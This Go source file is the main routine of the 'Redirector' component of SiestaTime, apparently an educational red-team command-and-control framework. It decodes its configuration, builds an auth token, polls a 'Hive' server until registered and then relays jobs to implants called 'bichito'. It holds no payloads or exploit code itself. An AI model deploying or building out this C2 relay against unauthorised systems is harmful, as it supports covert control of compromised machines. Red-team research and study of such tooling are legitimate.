//{{{{{{{ Redirector Main }}}}}}}

//// REdirector is the Modular Proxy software from SiestaTime Framework
// A. main


//By Rebujacker - Alvaro Folgado Rueda as an open source educative project
package main

import (
	"strings"
	//"redirector/modules/listener"
	"os"
	"encoding/json"
	"bytes"
	"time"
	"fmt"
	"sync"
)

type RedConfig struct {
    Roaster string   `json:"roaster"`
    HiveFingenprint   string `json:"hivefingenprint"`
    Token string `json:"token"`
    BiToken string `json:"bitoken"`
    Saas string   `json:"saas"`
    Coms string   `json:"coms"`
}

type RedAuth struct {
    Domain string   `json:"domain"`
    Token string  `json:"token"`  
}

type Job struct {
    Cid  string   `json:"cid"`              // The client CID triggered the job
    Jid  string   `json:"jid"`              // The Job Id (J-<ID>), useful to avoid replaying attacks
    Pid string   `json:"pid"`               // Parent Id, when the job came completed from a Implant, Pid is the Redirector where it cames from
    Chid string `json:"chid"`               // Implant Id
    Job string   `json:"job"`               // Job Name
    Time  string   `json:"time"`            // Time of creation
    Status  string   `json:"status"`        // Sent - Processing - Finished
    Result  string   `json:"result"`        // Job output data
    Parameters string   `json:"parameters"` // Parameters will be JSON serialized to provide flexibility
}

type JobsToHive struct {
	mux  sync.RWMutex
	Jobs []*Job
}

type JobsToBichito struct {
	mux  sync.RWMutex
	Jobs []*Job
}


var(
	parameters string
	redconfig *RedConfig 
	authbearer string
	rid string

	jobsToHive	*JobsToHive
	jobsToBichito *JobsToBichito
)

func main() {

	//Decode Redirector Parameters
	errDaws := json.Unmarshal([]byte(parameters),&redconfig)
	//Create authbearer for redirector checking and authorization process with Hive
	hostname,errorH := os.Hostname()
	if (errorH != nil) || (errDaws != nil){
		//This should create error logs, but have not even made checking yet
		fmt.Println("Error on parameters JSon decoding or getting hostname\n")
	}

	if redconfig.Saas != ""{
		hostname = redconfig.Saas
	}

	authbearerO := RedAuth{hostname,redconfig.Token}
	bufRP := new(bytes.Buffer)
	json.NewEncoder(bufRP).Encode(authbearerO)
	resultRP := bufRP.String()
	authbearer = resultRP 
	authbearer = strings.TrimSuffix(authbearer, "\n")

	//Initialize on memory slices for redirect Jobs
	var jobs []*Job
	jobsToHive	= &JobsToHive{Jobs:jobs}
	jobsToBichito = &JobsToBichito{Jobs:jobs}

	// Keep pinging Hive each 5 seconds till checking is done
	for{
		rid = checking()
		if strings.Contains(rid,"R-"){
			break
		}
		fmt.Println("Checking failed:"+rid)
		time.Sleep(5 * time.Second)
	}

	//Once hive cheking is performed, start listening for bichito's connections and Jobs
	bichitoHandler()
}